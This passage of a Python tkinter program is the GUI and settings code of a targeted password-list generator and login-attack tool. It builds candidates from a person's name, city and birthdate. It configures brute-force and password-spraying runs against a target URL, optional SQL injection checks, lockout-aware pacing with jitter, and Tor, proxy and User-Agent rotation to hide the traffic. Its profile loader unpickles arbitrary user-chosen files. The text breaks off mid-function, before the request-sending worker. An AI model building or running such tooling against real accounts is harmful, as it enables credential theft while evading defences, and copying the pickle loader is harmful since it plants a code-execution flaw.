import os
import sys
import gzip
import json
import time
import queue
import string
import threading
import itertools
import re
from collections import deque
from datetime import datetime
from urllib.parse import urlparse

import tkinter as tk
from tkinter import filedialog
from tkinter import messagebox
from tkinter import scrolledtext

# Try to use ttkbootstrap for a modern theme; fall back to standard ttk
try:
    import ttkbootstrap as tb
    from ttkbootstrap.dialogs import Messagebox as TbMessagebox
    USE_TTKBOOTSTRAP = True
except Exception:
    USE_TTKBOOTSTRAP = False

from tkinter import ttk

try:
    import requests
except Exception:
    requests = None


class RateLimiter:
    def __init__(self, qps: float) -> None:
        self.qps = max(0.1, float(qps))
        self.lock = threading.Lock()
        self.events: deque[float] = deque()

    def acquire(self) -> None:
        # Allow at most qps events per second across all threads
        while True:
            now = time.time()
            with self.lock:
                # Drop events older than 1 second
                while self.events and now - self.events[0] > 1.0:
                    self.events.popleft()
                if len(self.events) < int(self.qps):
                    self.events.append(now)
                    return
            time.sleep(0.01)


class PasswordListGeneratorApp:
    def __init__(self) -> None:
        self.use_bootstrap = USE_TTKBOOTSTRAP
        if self.use_bootstrap:
            self.style = tb.Style(theme="cosmo")
            self.root = self.style.master
            self.root.title("Password List Generator")
        else:
            self.root = tk.Tk()
            self.root.title("Password List Generator")
        self.root.geometry("980x760")

        # State
        self.worker_thread: threading.Thread | None = None
        self.ui_queue: queue.Queue = queue.Queue()
        self.is_running = False
        self.cancel_requested = False
        self.generated_count = 0
        self.total_estimated = 0
        self.start_time: float | None = None

        # Variables - profile and generation
        self.var_name = tk.StringVar()
        self.var_surname = tk.StringVar()
        self.var_city = tk.StringVar()
        self.var_birthdate = tk.StringVar(value="1990")

        self.var_min_len = tk.IntVar(value=4)
        self.var_max_len = tk.IntVar(value=6)
        self.var_special_chars = tk.StringVar(value="!@#$%_-")

        self.var_mode = tk.StringVar(value="Brute-force")  # Brute-force | Smart brute-force | Smart mutations
        self.var_include_digits = tk.BooleanVar(value=True)
        self.var_include_uppercase = tk.BooleanVar(value=True)
        self.var_gzip = tk.BooleanVar(value=False)

        self.var_output_path = tk.StringVar(value=self._default_output_path())

        # Variables - pentest target
        self.var_target_enabled = tk.BooleanVar(value=False)
        self.var_target_url = tk.StringVar(value="")
        self.var_http_method = tk.StringVar(value="POST")
        self.var_username_value = tk.StringVar(value="")
        self.var_user_param = tk.StringVar(value="username")
        self.var_pass_param = tk.StringVar(value="password")
        self.var_extra_params = tk.StringVar(value="")  # key=value&key2=value2
        self.var_success_codes = tk.StringVar(value="200,302")
        self.var_success_regex = tk.StringVar(value="")
        self.var_failure_regex = tk.StringVar(value="")
        self.var_qps = tk.DoubleVar(value=5.0)
        self.var_enable_sqli = tk.BooleanVar(value=False)
        self.var_sqli_field = tk.StringVar(value="password")  # username|password
        self.var_concurrency = tk.IntVar(value=5)
        self.var_headers_json = tk.StringVar(value="")
        self.var_cookies = tk.StringVar(value="")  # k=v; k2=v2
        self.var_proxy_url = tk.StringVar(value="")
        self.var_verify_tls = tk.BooleanVar(value=True)
        self.var_timeout = tk.DoubleVar(value=15.0)
        # Usernames & spraying
        self.var_usernames_file = tk.StringVar(value="")
        self.var_usernames_count = tk.StringVar(value="(none)")
        self.loaded_usernames: list[str] = []
        self.var_generate_patterns = tk.BooleanVar(value=True)
        self.var_email_domain = tk.StringVar(value="")
        self.var_lowercase_usernames = tk.BooleanVar(value=True)
        self.var_common_aliases = tk.BooleanVar(value=True)
        self.var_spray_enabled = tk.BooleanVar(value=False)
        self.var_spray_passwords_file = tk.StringVar(value="")
        self.var_spray_cooldown_min = tk.DoubleVar(value=15.0)
        self.var_spray_window_min = tk.DoubleVar(value=60.0)
        self.var_spray_attempts_per_window = tk.IntVar(value=1)
        self.var_spray_stop_on_success = tk.BooleanVar(value=True)
        # Lockout detection
        self.var_lockout_enabled = tk.BooleanVar(value=True)
        self.var_lockout_codes = tk.StringVar(value="429,423,403")
        self.var_lockout_regex = tk.StringVar(value="account locked|too many attempts|temporarily blocked|captcha")
        self.var_lockout_cooldown_min = tk.DoubleVar(value=30.0)
        self.var_lockout_jitter = tk.BooleanVar(value=True)
        # Proxy/User-Agent rotation
        self.var_tor_mode = tk.BooleanVar(value=False)
        self.var_tor_proxy = tk.StringVar(value="socks5h://127.0.0.1:9050")
        self.var_proxy_list_file = tk.StringVar(value="")
        self.loaded_proxies: list[str] = []
        self.var_proxy_rotation = tk.StringVar(value="per_request")  # per_request | per_worker
        self.var_user_agent_rotate = tk.BooleanVar(value=False)
        self.var_user_agent_list_file = tk.StringVar(value="")
        self.loaded_user_agents: list[str] = []
        self.var_user_agent_rotation = tk.StringVar(value="per_request")  # per_request | per_worker

        # Build UI
        self._build_ui()

        # UI queue processing
        self.root.after(100, self._process_ui_queue)

        # Graceful close
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

    def _default_output_path(self) -> str:
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        base = f"Passwordlist-{timestamp}.txt"
        return os.path.join(os.getcwd(), base)

    def _build_ui(self) -> None:
        padding = {"padx": 8, "pady": 6}

        main = ttk.Frame(self.root)
        main.pack(fill=tk.BOTH, expand=True)

        # Profile frame
        profile = ttk.LabelFrame(main, text="Profile")
        profile.pack(fill=tk.X, **padding)
        self._add_labeled_entry(profile, "Name", self.var_name, row=0, col=0)
        self._add_labeled_entry(profile, "Surname", self.var_surname, row=0, col=2)
        self._add_labeled_entry(profile, "City", self.var_city, row=1, col=0)
        self._add_labeled_entry(profile, "Birthdate (free text)", self.var_birthdate, row=1, col=2)

        # Generation options
        options = ttk.LabelFrame(main, text="Options")
        options.pack(fill=tk.X, **padding)
        ttk.Label(options, text="Mode").grid(row=0, column=0, sticky="e", padx=4, pady=4)
        mode_combo = ttk.Combobox(options, textvariable=self.var_mode, values=["Brute-force", "Smart brute-force", "Smart mutations"], state="readonly", width=18)
        mode_combo.grid(row=0, column=1, sticky="w", padx=4, pady=4)
        self._add_labeled_spinbox(options, "Min length", self.var_min_len, row=0, col=2, from_=1, to=16)
        self._add_labeled_spinbox(options, "Max length", self.var_max_len, row=0, col=4, from_=1, to=24)
        self._add_labeled_entry(options, "Special chars", self.var_special_chars, row=1, col=0)
        ttk.Checkbutton(options, text="Include digits 0-9", variable=self.var_include_digits).grid(row=1, column=2, sticky="w", padx=4, pady=4)
        ttk.Checkbutton(options, text="Include uppercase", variable=self.var_include_uppercase).grid(row=1, column=4, sticky="w", padx=4, pady=4)
        ttk.Checkbutton(options, text="Gzip output (.gz)", variable=self.var_gzip).grid(row=1, column=5, sticky="w", padx=4, pady=4)
        for i in range(0, 6):
            options.grid_columnconfigure(i, weight=1)

        # Target frame (pentest)
        target = ttk.LabelFrame(main, text="Pentest Target (authorized testing only)")
        target.pack(fill=tk.X, **padding)
        ttk.Checkbutton(target, text="Enable Pentest (send candidates to target)", variable=self.var_target_enabled).grid(row=0, column=0, columnspan=4, sticky="w", padx=4, pady=4)
        self._add_labeled_entry(target, "URL", self.var_target_url, row=1, col=0)
        ttk.Label(target, text="Method").grid(row=1, column=2, sticky="e", padx=4, pady=4)
        ttk.Combobox(target, textvariable=self.var_http_method, values=["POST", "GET"], width=8, state="readonly").grid(row=1, column=3, sticky="w", padx=4, pady=4)
        self._add_labeled_entry(target, "Username value", self.var_username_value, row=2, col=0)
        self._add_labeled_entry(target, "Username param", self.var_user_param, row=2, col=2)
        self._add_labeled_entry(target, "Password param", self.var_pass_param, row=2, col=4)
        self._add_labeled_entry(target, "Extra params (k=v&k2=v2)", self.var_extra_params, row=3, col=0)
        self._add_labeled_entry(target, "Success codes (csv)", self.var_success_codes, row=3, col=2)
        self._add_labeled_entry(target, "Success regex (opt)", self.var_success_regex, row=3, col=4)
        self._add_labeled_entry(target, "Failure regex (opt)", self.var_failure_regex, row=4, col=0)
        self._add_labeled_entry(target, "Rate limit QPS", self.var_qps, row=4, col=2)
        self._add_labeled_spinbox(target, "Concurrency", self.var_concurrency, row=4, col=4, from_=1, to=32)
        ttk.Checkbutton(target, text="Run SQL injection checks", variable=self.var_enable_sqli).grid(row=4, column=6, sticky="w", padx=4, pady=4)
        ttk.Label(target, text="SQLi field").grid(row=4, column=7, sticky="e", padx=4, pady=4)
        ttk.Combobox(target, textvariable=self.var_sqli_field, values=["username", "password"], width=10, state="readonly").grid(row=4, column=8, sticky="w", padx=4, pady=4)
        self._add_labeled_entry(target, "Headers JSON", self.var_headers_json, row=5, col=0)
        self._add_labeled_entry(target, "Cookies (k=v; k2=v2)", self.var_cookies, row=5, col=2)
        self._add_labeled_entry(target, "Proxy URL", self.var_proxy_url, row=5, col=4)
        ttk.Checkbutton(target, text="Verify TLS", variable=self.var_verify_tls).grid(row=5, column=6, sticky="w", padx=4, pady=4)
        self._add_labeled_entry(target, "Timeout (s)", self.var_timeout, row=5, col=7)
        # Lockout detection controls
        ttk.Checkbutton(target, text="Enable lockout detection", variable=self.var_lockout_enabled).grid(row=6, column=0, sticky="w", padx=4, pady=4)
        self._add_labeled_entry(target, "Lockout codes (csv)", self.var_lockout_codes, row=6, col=2)
        self._add_labeled_entry(target, "Lockout regex", self.var_lockout_regex, row=6, col=4)
        self._add_labeled_entry(target, "Lockout cooldown (min)", self.var_lockout_cooldown_min, row=6, col=6)
        ttk.Checkbutton(target, text="Jitter", variable=self.var_lockout_jitter).grid(row=6, column=8, sticky="w", padx=4, pady=4)
        # Proxy & UA rotation
        ttk.Checkbutton(target, text="Use Tor (SOCKS5)", variable=self.var_tor_mode).grid(row=7, column=0, sticky="w", padx=4, pady=4)
        self._add_labeled_entry(target, "Tor proxy", self.var_tor_proxy, row=7, col=2)
        self._add_labeled_entry(target, "Proxy list file", self.var_proxy_list_file, row=7, col=4)
        ttk.Button(target, text="Browse…", command=self.on_browse_proxy_list_file).grid(row=7, column=6, sticky="w", padx=4, pady=4)
        ttk.Label(target, text="Proxy rotation").grid(row=7, column=7, sticky="e", padx=4, pady=4)
        ttk.Combobox(target, textvariable=self.var_proxy_rotation, values=["per_request", "per_worker"], width=12, state="readonly").grid(row=7, column=8, sticky="w", padx=4, pady=4)
        ttk.Checkbutton(target, text="Rotate User-Agent", variable=self.var_user_agent_rotate).grid(row=8, column=0, sticky="w", padx=4, pady=4)
        self._add_labeled_entry(target, "UA list file", self.var_user_agent_list_file, row=8, col=2)
        ttk.Button(target, text="Browse…", command=self.on_browse_user_agent_list_file).grid(row=8, column=4, sticky="w", padx=4, pady=4)
        ttk.Label(target, text="UA rotation").grid(row=8, column=5, sticky="e", padx=4, pady=4)
        ttk.Combobox(target, textvariable=self.var_user_agent_rotation, values=["per_request", "per_worker"], width=12, state="readonly").grid(row=8, column=6, sticky="w", padx=4, pady=4)
        for i in range(0, 9):
            target.grid_columnconfigure(i, weight=1)

        # Usernames & Spray controls
        users = ttk.LabelFrame(main, text="Usernames & Password Spraying")
        users.pack(fill=tk.X, **padding)
        # Username file loader
        ttk.Label(users, text="Usernames file (one per line)").grid(row=0, column=0, sticky="e", padx=4, pady=4)
        ttk.Entry(users, textvariable=self.var_usernames_file).grid(row=0, column=1, sticky="we", padx=4, pady=4)
        ttk.Button(users, text="Browse…", command=self.on_browse_usernames_file).grid(row=0, column=2, sticky="w", padx=4, pady=4)
        ttk.Label(users, textvariable=self.var_usernames_count).grid(row=0, column=3, sticky="w", padx=4, pady=4)
        # Username discovery options
        ttk.Checkbutton(users, text="Generate patterns", variable=self.var_generate_patterns).grid(row=1, column=0, sticky="w", padx=4, pady=4)
        ttk.Label(users, text="Email domain").grid(row=1, column=1, sticky="e", padx=4, pady=4)
        ttk.Entry(users, textvariable=self.var_email_domain).grid(row=1, column=2, sticky="we", padx=4, pady=4)
        ttk.Button(users, text="Use target domain", command=self.on_use_target_domain).grid(row=1, column=3, sticky="w", padx=4, pady=4)
        ttk.Checkbutton(users, text="Lowercase usernames", variable=self.var_lowercase_usernames).grid(row=1, column=4, sticky="w", padx=4, pady=4)
        ttk.Checkbutton(users, text="Include common aliases", variable=self.var_common_aliases).grid(row=1, column=5, sticky="w", padx=4, pady=4)
        # Spray controls
        ttk.Checkbutton(users, text="Enable Password Spraying", variable=self.var_spray_enabled).grid(row=2, column=0, sticky="w", padx=4, pady=4)
        ttk.Label(users, text="Passwords file (one per line)").grid(row=2, column=1, sticky="e", padx=4, pady=4)
        ttk.Entry(users, textvariable=self.var_spray_passwords_file).grid(row=2, column=2, sticky="we", padx=4, pady=4)
        ttk.Button(users, text="Browse…", command=self.on_browse_passwords_file).grid(row=2, column=3, sticky="w", padx=4, pady=4)
        self._add_labeled_entry(users, "Cooldown (min)", self.var_spray_cooldown_min, row=3, col=0)
        self._add_labeled_entry(users, "Window (min)", self.var_spray_window_min, row=3, col=2)
        self._add_labeled_spinbox(users, "Attempts/user/window", self.var_spray_attempts_per_window, row=3, col=4, from_=1, to=5)
        ttk.Checkbutton(users, text="Stop on first success", variable=self.var_spray_stop_on_success).grid(row=3, column=6, sticky="w", padx=4, pady=4)
        for i in range(0, 7):
            users.grid_columnconfigure(i, weight=1)

        # Output selection
        out = ttk.LabelFrame(main, text="Output (ignored when Pentest is enabled)")
        out.pack(fill=tk.X, **padding)
        ttk.Label(out, text="File").grid(row=0, column=0, sticky="e", padx=4, pady=4)
        entry = ttk.Entry(out, textvariable=self.var_output_path)
        entry.grid(row=0, column=1, sticky="we", padx=4, pady=4)
        browse = ttk.Button(out, text="Browse…", command=self._choose_output_file)
        browse.grid(row=0, column=2, sticky="w", padx=4, pady=4)
        out.grid_columnconfigure(1, weight=1)

        # Actions
        actions = ttk.Frame(main)
        actions.pack(fill=tk.X, **padding)
        self.btn_generate = ttk.Button(actions, text="Run", command=self.on_generate)
        self.btn_generate.pack(side=tk.LEFT)
        self.btn_cancel = ttk.Button(actions, text="Cancel", command=self.on_cancel, state=tk.DISABLED)
        self.btn_cancel.pack(side=tk.LEFT, padx=8)
        self.btn_save = ttk.Button(actions, text="Save Profile", command=self.on_save_profile)
        self.btn_save.pack(side=tk.LEFT, padx=8)
        self.btn_load = ttk.Button(actions, text="Load Profile", command=self.on_load_profile)
        self.btn_load.pack(side=tk.LEFT, padx=8)

        # Progress
        progress_frame = ttk.Frame(main)
        progress_frame.pack(fill=tk.X, **padding)
        self.progress_var = tk.DoubleVar(value=0.0)
        self.progress_bar = ttk.Progressbar(progress_frame, orient=tk.HORIZONTAL, length=260, mode='determinate', variable=self.progress_var)
        self.progress_bar.pack(fill=tk.X)
        self.status_var = tk.StringVar(value="Idle")
        self.status_label = ttk.Label(progress_frame, textvariable=self.status_var)
        self.status_label.pack(anchor="w", pady=4)

        # Preview/Log
        preview = ttk.LabelFrame(main, text="Output preview / Logs")
        preview.pack(fill=tk.BOTH, expand=True, **padding)
        self.preview_text = scrolledtext.ScrolledText(preview, height=20)
        self.preview_text.pack(fill=tk.BOTH, expand=True)
        self.preview_text.configure(state=tk.DISABLED)

        # Footer note
        note = ttk.Label(main, text="Only test systems you are authorized to assess. Brute-force grows exponentially; prefer Smart modes.")
        note.pack(anchor="w", padx=10, pady=(0, 10))

    def _add_labeled_entry(self, master, label, var, row, col) -> None:
        ttk.Label(master, text=label).grid(row=row, column=col, sticky="e", padx=4, pady=4)
        entry = ttk.Entry(master, textvariable=var, width=28)
        entry.grid(row=row, column=col + 1, sticky="we", padx=4, pady=4)

    def _add_labeled_spinbox(self, master, label, var, row, col, from_, to) -> None:
        ttk.Label(master, text=label).grid(row=row, column=col, sticky="e", padx=4, pady=4)
        spin = ttk.Spinbox(master, textvariable=var, from_=from_, to=to, width=6)
        spin.grid(row=row, column=col + 1, sticky="w", padx=4, pady=4)

    def _choose_output_file(self) -> None:
        default = self.var_output_path.get() or self._default_output_path()
        initialdir = os.path.dirname(default) if os.path.dirname(default) else os.getcwd()
        def_ext = ".txt.gz" if self.var_gzip.get() else ".txt"
        filetypes = [("Gzip text", "*.txt.gz"), ("Text", "*.txt"), ("All files", "*.*")]
        path = filedialog.asksaveasfilename(initialdir=initialdir, initialfile=os.path.basename(default), defaultextension=def_ext, filetypes=filetypes)
        if path:
            self.var_output_path.set(path)

    def _process_ui_queue(self) -> None:
        try:
            while True:
                item = self.ui_queue.get_nowait()
                if item[0] == "progress":
                    _, completed, total, elapsed = item
                    percent = (completed / total * 100.0) if total > 0 else 0.0
                    self.progress_var.set(percent)
                    eta = (elapsed / completed * (total - completed)) if completed > 0 and total > completed else 0.0
                    self.status_var.set(f"Progress: {completed:,}/{total:,}  |  {percent:0.2f}%  |  Elapsed: {self._fmt_sec(elapsed)}  |  ETA: {self._fmt_sec(eta)}")
                elif item[0] == "sample":
                    _, sample = item
                    self._append_preview(sample)
                elif item[0] == "log":
                    _, msg = item
                    self._append_preview(msg)
                elif item[0] == "done":
                    _, completed, extra = item
                    self._on_done(completed, extra)
                elif item[0] == "message":
                    _, msg = item
                    self.status_var.set(msg)
        except queue.Empty:
            pass
        finally:
            self.root.after(100, self._process_ui_queue)

    def _append_preview(self, line: str) -> None:
        self.preview_text.configure(state=tk.NORMAL)
        self.preview_text.insert(tk.END, line + "\n")
        if float(self.preview_text.index('end-1c').split('.')[0]) > 5000:
            self.preview_text.delete('1.0', '2.0')
        self.preview_text.see(tk.END)
        self.preview_text.configure(state=tk.DISABLED)

    def _on_done(self, completed: int, extra: str = "") -> None:
        self.is_running = False
        self.cancel_requested = False
        self.btn_generate.configure(state=tk.NORMAL)
        self.btn_cancel.configure(state=tk.DISABLED)
        if self.total_estimated:
            self.progress_var.set(min(100.0, self.progress_var.get()))
        msg = extra or f"Completed. Processed {completed:,} items."
        self.status_var.set(msg)
        try:
            if self.use_bootstrap:
                TbMessagebox.show_info("Done", msg)
            else:
                messagebox.showinfo("Done", msg)
        except Exception:
            pass

    def _fmt_sec(self, seconds: float) -> str:
        seconds = max(0.0, float(seconds))
        m, s = divmod(int(seconds), 60)
        h, m = divmod(m, 60)
        if h > 0:
            return f"{h}h {m}m {s}s"
        if m > 0:
            return f"{m}m {s}s"
        return f"{s}s"

    def on_generate(self) -> None:
        if self.is_running:
            return
        try:
            min_len = int(self.var_min_len.get())
            max_len = int(self.var_max_len.get())
            if min_len <= 0 or max_len <= 0 or max_len < min_len:
                raise ValueError
        except Exception:
            messagebox.showerror("Invalid lengths", "Please provide valid positive min/max lengths (max >= min).")
            return

        pentest_enabled = bool(self.var_target_enabled.get())
        pentest_args = {}
        if pentest_enabled:
            if requests is None:
                messagebox.showerror("Missing dependency", "The 'requests' package is required for Pentest mode.")
                return
            url = self.var_target_url.get().strip()
            if not url:
                messagebox.showerror("Target URL", "Please enter the target URL.")
                return
            username = self.var_username_value.get().strip()
            user_param = self.var_user_param.get().strip() or "username"
            pass_param = self.var_pass_param.get().strip() or "password"
            success_codes = self._parse_codes(self.var_success_codes.get())
            succ_re = self._compile_regex(self.var_success_regex.get())
            fail_re = self._compile_regex(self.var_failure_regex.get())
            extra_params = self._parse_extra_params(self.var_extra_params.get())
            qps = max(0.1, float(self.var_qps.get() or 5.0))
            headers = self._parse_headers_json(self.var_headers_json.get())
            cookies = self._parse_cookies(self.var_cookies.get())
            proxy = self.var_proxy_url.get().strip()
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            verify_tls = bool(self.var_verify_tls.get())
            timeout = float(self.var_timeout.get() or 15.0)
            concurrency = max(1, int(self.var_concurrency.get() or 5))
            # Usernames collection
            usernames = self._collect_usernames(username)
            if not usernames:
                messagebox.showerror("Usernames", "Provide a username value or a usernames file, or enable pattern generation.")
                return
            # Spray configuration
            spray_enabled = bool(self.var_spray_enabled.get())
            passwords = []
            cooldown_min = float(self.var_spray_cooldown_min.get() or 15.0)
            window_min = float(self.var_spray_window_min.get() or 60.0)
            attempts_per_window = max(1, int(self.var_spray_attempts_per_window.get() or 1))
            min_cooldown = max(0.1, window_min / attempts_per_window)
            if spray_enabled:
                if not self.var_spray_passwords_file.get().strip():
                    messagebox.showerror("Spray passwords", "Please choose a passwords file for spraying (one per line).")
                    return
                passwords = self._parse_list_file(self.var_spray_passwords_file.get().strip())
                if not passwords:
                    messagebox.showerror("Spray passwords", "No passwords found in file.")
                    return
                if cooldown_min < min_cooldown:
                    cooldown_min = min_cooldown
                    self.ui_queue.put(("log", f"Cooldown increased to {cooldown_min} min to respect window policy ({attempts_per_window} attempts per {window_min} min)."))
            # Proxy & UA rotation config
            proxies_list = []
            if self.var_proxy_list_file.get().strip():
                proxies_list = self._parse_list_file(self.var_proxy_list_file.get().strip())
            ua_list = []
            if self.var_user_agent_rotate.get():
                if self.var_user_agent_list_file.get().strip():
                    ua_list = self._parse_list_file(self.var_user_agent_list_file.get().strip())
                if not ua_list:
                    ua_list = self._built_in_user_agents()
            pentest_args = {
                "enabled": True,
                "url": url,
                "method": self.var_http_method.get().upper(),
                "username": username,
                "user_param": user_param,
                "pass_param": pass_param,
                "extra_params": extra_params,
                "success_codes": success_codes,
                "success_regex": succ_re,
                "failure_regex": fail_re,
                "qps": qps,
                "enable_sqli": bool(self.var_enable_sqli.get()),
                "sqli_field": self.var_sqli_field.get(),
                "headers": headers,
                "cookies": cookies,
                "proxies": proxies,
                "verify": verify_tls,
                "timeout": timeout,
                "concurrency": concurrency,
                "usernames": usernames,
                "spray_enabled": spray_enabled,
                "spray_passwords": passwords,
                "spray_cooldown_sec": float(cooldown_min) * 60.0,
                "spray_stop_on_success": bool(self.var_spray_stop_on_success.get()),
                "email_domain": self.var_email_domain.get().strip(),
                "lockout_enabled": bool(self.var_lockout_enabled.get()),
                "lockout_codes": self._parse_codes(self.var_lockout_codes.get()),
                "lockout_regex": self._compile_regex(self.var_lockout_regex.get()),
                "lockout_cooldown_sec": float(self.var_lockout_cooldown_min.get() or 30.0) * 60.0,
                "lockout_jitter": bool(self.var_lockout_jitter.get()),
                # rotation
                "tor_mode": bool(self.var_tor_mode.get()),
                "tor_proxy": self.var_tor_proxy.get().strip(),
                "proxies_list": proxies_list,
                "proxy_rotation": self.var_proxy_rotation.get(),
                "user_agents": ua_list,
                "ua_rotation": self.var_user_agent_rotation.get() if self.var_user_agent_rotate.get() else "none",
            }

        mode = self.var_mode.get()
        if mode == "Brute-force":
            char_set = self._build_bruteforce_charset()
            n = len(char_set)
            if n <= 0:
                messagebox.showerror("Character set", "Character set is empty. Provide inputs or special characters.")
                return
            total_est = self._geom_series(n, min_len, max_len)
        elif mode == "Smart brute-force":
            total_est = self._estimate_smart_bruteforce_total(min_len, max_len)
        else:
            total_est = self._estimate_smart_total(min_len, max_len)

        # If spraying, override estimate to reflect usernames x passwords
        if pentest_enabled and pentest_args.get("spray_enabled"):
            total_est = len(pentest_args.get("usernames", [])) * len(pentest_args.get("spray_passwords", []))

        HARD_CAP = 25_000_000
        WARN_CAP = 5_000_000
        if total_est > HARD_CAP and mode == "Brute-force" and not pentest_enabled:
            messagebox.showwarning("Too large", f"Estimated {total_est:,} candidates which exceeds the hard cap of {HARD_CAP:,}. Reduce lengths or character set.")
            return
        if total_est > WARN_CAP and not pentest_enabled:
            proceed = messagebox.askyesno("Large generation", f"Estimated to generate about {total_est:,} candidates. This may take a long time and large disk space. Continue?")
            if not proceed:
                return

        # Prepare UI
        self.preview_text.configure(state=tk.NORMAL)
        self.preview_text.delete('1.0', tk.END)
        self.preview_text.configure(state=tk.DISABLED)
        self.progress_var.set(0.0)
        self.status_var.set("Starting…")
        self.generated_count = 0
        self.total_estimated = total_est
        self.start_time = time.time()

        # Start worker
        self.is_running = True
        self.cancel_requested = False
        self.btn_generate.configure(state=tk.DISABLED)
        self.btn_cancel.configure(state=tk.NORMAL)

        args = {
            "mode": mode,
            "min_len": min_len,
            "max_len": max_len,
            "gzip": self.var_gzip.get(),
            "output_path": self.var_output_path.get(),
            "pentest": pentest_args,
        }
        self.worker_thread = threading.Thread(target=self._worker, args=(args,), daemon=True)
        self.worker_thread.start()

    def on_cancel(self) -> None:
        if not self.is_running:
            return
        self.cancel_requested = True
        self.status_var.set("Canceling…")

    def on_close(self) -> None:
        # Graceful shutdown on window close
        if self.is_running:
            try:
                self.cancel_requested = True
                self.status_var.set("Canceling before exit…")
                if self.worker_thread and self.worker_thread.is_alive():
                    self.worker_thread.join(timeout=3.0)
            except Exception:
                pass
        try:
            self.root.destroy()
        except Exception:
            os._exit(0)

    def on_save_profile(self) -> None:
        profile = {
            "name": self.var_name.get(),
            "surname": self.var_surname.get(),
            "city": self.var_city.get(),
            "birthdate": self.var_birthdate.get(),
            "min_len": self.var_min_len.get(),
            "max_len": self.var_max_len.get(),
            "special_chars": self.var_special_chars.get(),
            "include_digits": self.var_include_digits.get(),
            "include_uppercase": self.var_include_uppercase.get(),
            "mode": self.var_mode.get(),
            "gzip": self.var_gzip.get(),
            # Pentest
            "target_enabled": self.var_target_enabled.get(),
            "target_url": self.var_target_url.get(),
            "http_method": self.var_http_method.get(),
            "username_value": self.var_username_value.get(),
            "user_param": self.var_user_param.get(),
            "pass_param": self.var_pass_param.get(),
            "extra_params": self.var_extra_params.get(),
            "success_codes": self.var_success_codes.get(),
            "success_regex": self.var_success_regex.get(),
            "failure_regex": self.var_failure_regex.get(),
            "qps": self.var_qps.get(),
            "enable_sqli": self.var_enable_sqli.get(),
            "sqli_field": self.var_sqli_field.get(),
            "concurrency": self.var_concurrency.get(),
            "headers_json": self.var_headers_json.get(),
            "cookies": self.var_cookies.get(),
            "proxy_url": self.var_proxy_url.get(),
            "verify_tls": self.var_verify_tls.get(),
            "timeout": self.var_timeout.get(),
            # Usernames & spraying
            "usernames_file": self.var_usernames_file.get(),
            "email_domain": self.var_email_domain.get(),
            "generate_patterns": self.var_generate_patterns.get(),
            "lowercase_usernames": self.var_lowercase_usernames.get(),
            "common_aliases": self.var_common_aliases.get(),
            "spray_enabled": self.var_spray_enabled.get(),
            "spray_passwords_file": self.var_spray_passwords_file.get(),
            "spray_cooldown_min": self.var_spray_cooldown_min.get(),
            "spray_window_min": self.var_spray_window_min.get(),
            "spray_attempts_per_window": self.var_spray_attempts_per_window.get(),
            "spray_stop_on_success": self.var_spray_stop_on_success.get(),
            # Lockout
            "lockout_enabled": self.var_lockout_enabled.get(),
            "lockout_codes": self.var_lockout_codes.get(),
            "lockout_regex": self.var_lockout_regex.get(),
            "lockout_cooldown_min": self.var_lockout_cooldown_min.get(),
            "lockout_jitter": self.var_lockout_jitter.get(),
            # Rotation
            "tor_mode": self.var_tor_mode.get(),
            "tor_proxy": self.var_tor_proxy.get(),
            "proxy_list_file": self.var_proxy_list_file.get(),
            "proxy_rotation": self.var_proxy_rotation.get(),
            "user_agent_rotate": self.var_user_agent_rotate.get(),
            "user_agent_list_file": self.var_user_agent_list_file.get(),
            "user_agent_rotation": self.var_user_agent_rotation.get(),
        }
        path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("Profile JSON", "*.json"), ("All files", "*.*")])
        if not path:
            return
        try:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(profile, f, indent=2)
            self._info("Profile saved")
        except Exception as exc:
            messagebox.showerror("Save failed", str(exc))

    def on_load_profile(self) -> None:
        path = filedialog.askopenfilename(filetypes=[("Profile JSON", "*.json"), ("Legacy pickle", "*.pkl"), ("All files", "*.*")])
        if not path:
            return
        try:
            if path.endswith(".json"):
                with open(path, "r", encoding="utf-8") as f:
                    profile = json.load(f)
            else:
                import pickle
                with open(path, "rb") as f:
                    profile = pickle.load(f)
        except Exception as exc:
            messagebox.showerror("Load failed", f"Could not load profile: {exc}")
            return

        self.var_name.set(profile.get("name", ""))
        self.var_surname.set(profile.get("surname", ""))
        self.var_city.set(profile.get("city", ""))
        self.var_birthdate.set(profile.get("birthdate", ""))
        self.var_min_len.set(int(profile.get("min_len", 4)))
        self.var_max_len.set(int(profile.get("max_len", 6)))
        self.var_special_chars.set(profile.get("special_chars", "!@#$%_-"))
        self.var_include_digits.set(bool(profile.get("include_digits", True)))
        self.var_include_uppercase.set(bool(profile.get("include_uppercase", True)))
        self.var_mode.set(profile.get("mode", "Brute-force"))
        self.var_gzip.set(bool(profile.get("gzip", False)))

        self.var_target_enabled.set(bool(profile.get("target_enabled", False)))
        self.var_target_url.set(profile.get("target_url", ""))
        self.var_http_method.set(profile.get("http_method", "POST"))
        self.var_username_value.set(profile.get("username_value", ""))
        self.var_user_param.set(profile.get("user_param", "username"))
        self.var_pass_param.set(profile.get("pass_param", "password"))
        self.var_extra_params.set(profile.get("extra_params", ""))
        self.var_success_codes.set(profile.get("success_codes", "200,302"))
        self.var_success_regex.set(profile.get("success_regex", ""))
        self.var_failure_regex.set(profile.get("failure_regex", ""))
        self.var_qps.set(float(profile.get("qps", 5.0)))
        self.var_enable_sqli.set(bool(profile.get("enable_sqli", False)))
        self.var_sqli_field.set(profile.get("sqli_field", "password"))
        self.var_concurrency.set(int(profile.get("concurrency", 5)))
        self.var_headers_json.set(profile.get("headers_json", ""))
        self.var_cookies.set(profile.get("cookies", ""))
        self.var_proxy_url.set(profile.get("proxy_url", ""))
        self.var_verify_tls.set(bool(profile.get("verify_tls", True)))
        self.var_timeout.set(float(profile.get("timeout", 15.0)))

        # usernames & spraying
        self.var_usernames_file.set(profile.get("usernames_file", ""))
        if self.var_usernames_file.get():
            self.loaded_usernames = self._parse_list_file(self.var_usernames_file.get())
            self.var_usernames_count.set(f"loaded: {len(self.loaded_usernames)}")
        else:
            self.var_usernames_count.set("(none)")
        self.var_email_domain.set(profile.get("email_domain", ""))
        self.var_generate_patterns.set(bool(profile.get("generate_patterns", True)))
        self.var_lowercase_usernames.set(bool(profile.get("lowercase_usernames", True)))
        self.var_common_aliases.set(bool(profile.get("common_aliases", True)))
        self.var_spray_enabled.set(bool(profile.get("spray_enabled", False)))
        self.var_spray_passwords_file.set(profile.get("spray_passwords_file", ""))
